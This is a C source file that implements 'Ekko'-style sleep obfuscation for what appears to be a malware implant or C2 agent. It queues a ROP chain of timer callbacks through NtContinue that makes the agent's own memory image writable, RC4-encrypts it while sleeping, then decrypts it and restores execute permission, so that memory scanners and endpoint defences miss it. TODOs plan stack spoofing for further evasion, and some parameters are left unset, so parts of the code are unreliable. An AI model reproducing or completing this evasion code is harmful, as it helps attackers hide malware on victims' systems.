#include "EkkoSleepObf.h"

BOOL EkkoSleepObf(
	_In_ DWORD TimeOut
)
{
    HANDLE   Queue = { 0 };
    HANDLE   Timer = { 0 };
    HANDLE   ThdSrc = { 0 };
    HANDLE   EvntStart = { 0 };
    HANDLE   EvntTimer = { 0 };
    HANDLE   EvntDelay = { 0 };
    HANDLE   EvntWait = { 0 };
    BYTE    Buf[16] = { 0 };
    USTRING  Key = { 0 };
    USTRING  Img = { 0 };
    PVOID    ImgBase = { 0 };
    DWORD    ImgSize = { 0 };
    CONTEXT  TimerCtx = { 0 };
    CONTEXT  ThdCtx = { 0 };
    CONTEXT  Rop[13] = { 0 };
    DWORD    Value = { 0 };
    DWORD    Delay = { 0 };
    BOOL     Success = { 0 };
    NT_TIB   NtTib = { 0 };
    NT_TIB   BkpTib = { 0 };
    NTSTATUS NtStatus = { 0 };
    DWORD    Inc = { 0 };
    LPVOID   ImageBase = { 0 };
    SIZE_T   ImageSize = { 0 };
    LPVOID   TxtBase = { 0 };
    SIZE_T   TxtSize = { 0 };
    DWORD    Protect = { 0 };
    BYTE     JmpBypass = { 0 };
    PVOID    JmpGadget = { 0 };
    BYTE     JmpPad[] = { 0xFF, 0xE0 };

    ImgBase = TxtBase = agent->ModuleBaseAddr;
    ImageSize = TxtSize = agent->ImageSize;

    Protect = PAGE_EXECUTE_READWRITE;

    // JmpBypass =  TODO implement jump bypass if we can figure out how it works.

	// TODO implement TxtBase and TxtSize & Protect options for returning the Txt section of memory back to normal after we are done.

    /* Create Random Key for payload encryption during sleep cycle. 16 byte key.*/
    for (BYTE i = 0; i < 16; i++)
    {
        Buf[i] = GenerateRandomNumber();
    }

    // set specific context flags.
	ThdCtx.ContextFlags = TimerCtx.ContextFlags = CONTEXT_FULL;

    Key.Buffer = Buf;
    Key.Length = Key.MaximumLength = sizeof(Buf);

    Img.Buffer = ImgBase = agent->ModuleBaseAddr;
	Img.Length = Img.MaximumLength = agent->ImageSize;

    NtStatus = agent->apis->pRtlCreateTimerQueue(&Queue);

    if (NtStatus == 0)
    {
        if ((NtStatus = agent->apis->pNtCreateEvent(&EvntTimer, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE) == 0) &&
            (NtStatus = agent->apis->pNtCreateEvent(&EvntStart, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE) == 0) &&
            (NtStatus = agent->apis->pNtCreateEvent(&EvntDelay, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE) == 0))
        {
            NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)agent->apis->pRtlCaptureContext, &TimerCtx, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD);

            if (NtStatus == 0)
            {
                //send the event that we got the context of timers thread.
                if ((NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)EventSet, EvntTimer, Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) == 0)
                {
                    //wait untilk we successfully retrieved the timers thread.
                    if (!(NtStatus = agent->apis->pNtWaitForSingleObject(EvntTimer, FALSE, NULL) >= 0))
                    {
                        printf("[error] attempting to wait for timer event failed. %lx\n", NtStatus);
                        goto END;
                    }

                    //TODO implement stack spoofing for extra obfuscation.


                    //TODO implement jmp bypassing. for extra obfuscation.

                    //start preparing ROP chains.
                    for (int i = 0; i < 13; i++)
                    {
                        MemoryCopy(&Rop[i], &TimerCtx, sizeof(CONTEXT));
                        Rop[i].Rip = (UINT_PTR)JmpGadget; //set RIP to null for right now. More useful for when i have a JmpGadget.
                        Rop[i].Rsp -= sizeof(PVOID);
                    }

                    /* start rop chain with WaitForSingleObject. */
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
                    Rop[Inc].Rcx = (UINT_PTR)EvntStart;
                    Rop[Inc].Rdx = (UINT_PTR)INFINITE;
                    Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
                    Inc++;

                    /*Virtual protect*/
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pVirtualProtect;
                    Rop[Inc].Rcx = (UINT_PTR)ImgBase;
                    Rop[Inc].Rdx = (UINT_PTR)ImgSize;
                    Rop[Inc].R8 = (UINT_PTR)PAGE_READWRITE;
                    Rop[Inc].R9 = (UINT_PTR)&Value;
                    Inc++;

                    /*Encrypt Image */
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pSystemFunction032;
                    Rop[Inc].Rcx = (UINT_PTR)&Img;
                    Rop[Inc].Rdx = (UINT_PTR)&Key;
                    Inc++;


                    //TODO  stack spoof for rop chain

                    /* Sleep */
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pWaitForSingleObjectEx;
                    Rop[Inc].Rcx = (UINT_PTR)NtCurrentProcess();
                    Rop[Inc].Rdx = (UINT_PTR)(Delay + TimeOut);
                    Rop[Inc].R8 = (UINT_PTR)0; // FALSE.
                    Inc++;

                    /* TODO undo stack spoof */

                    /* Decrypt */
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pSystemFunction032;
                    Rop[Inc].Rcx = (UINT_PTR)&Img;
                    Rop[Inc].Rdx = (UINT_PTR)&Key;
                    Inc++;

                    /*Virtual protect*/
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pVirtualProtect;
                    Rop[Inc].Rcx = (UINT_PTR)TxtBase;
                    Rop[Inc].Rdx = (UINT_PTR)TxtSize;
                    Rop[Inc].R8 = (UINT_PTR)Protect;
                    Rop[Inc].R9 = (UINT_PTR)&Value;
                    Inc++;

                    /* End Rop Chain */
                    Rop[Inc].Rip = (UINT_PTR)agent->apis->pNtSetEvent;
                    Rop[Inc].Rcx = (UINT_PTR)EvntDelay;
                    Rop[Inc].Rdx = (UINT_PTR)NULL;
                    Inc++;

                    /*
                    Execute & Queue the timers
                    */
                    for (int i = 0; i < Inc; i++)
                    {
                        if ((NtStatus = agent->apis->pRtlCreateTimer(Queue, &Timer, (LPVOID)agent->apis->pNtContinue, &Rop[i], Delay += 100, 0, WT_EXECUTEINTIMERTHREAD)) < 0)
                        {
                            printf("[error] attempting to create timers for execution: %lx\n", NtStatus);
                            goto END;
                        }
                    }

                    /* Wait for the sleep to end*/
                    if ((NtStatus = agent->apis->pNtSignalAndWaitForSingleObject(EvntStart, EvntDelay, FALSE, NULL)) < 0)
                    {
                        printf("[error] NtSignalAndWaitForSingleObject failed: %lx\n", NtStatus);
                    }
                }
                else {
                    printf("[error] failed to create timer. %lx\n", NtStatus);
                }

            }
            else {
                printf("[error] failed to create timer. %lx\n", NtStatus);
            }
			
        }
        else {
            printf("[error] failed to create timer events. %lx\n", NtStatus);
        }
    }
	else {
		printf("[error] failed to create timer queue. %lx\n", NtStatus);
	}


END:
    if (Queue) {
        agent->apis->pRtlDeleteTimerQueue(Queue);
        Queue = NULL;
    }

    if (EvntTimer) {
        agent->apis->pNtClose(EvntTimer);
        EvntTimer = NULL;
    }

    if (EvntStart) {
        agent->apis->pNtClose(EvntStart);
        EvntStart = NULL;
    }

    if (EvntDelay) {
        agent->apis->pNtClose(EvntDelay);
        EvntDelay = NULL;
    }

    if (EvntWait) {
        agent->apis->pNtClose(EvntWait);
        EvntWait = NULL;
    }

    if (ThdSrc) {
        agent->apis->pNtClose(ThdSrc);
        ThdSrc = NULL;
    }

    /* clear the structs from stack */
    for (int i = 0; i < 13; i++) {
        RtlSecureZeroMemory(&Rop[i], sizeof(CONTEXT));
    }

    /* clear key from memory */
    RtlSecureZeroMemory(Buf, sizeof(Buf));

    return Success;
}

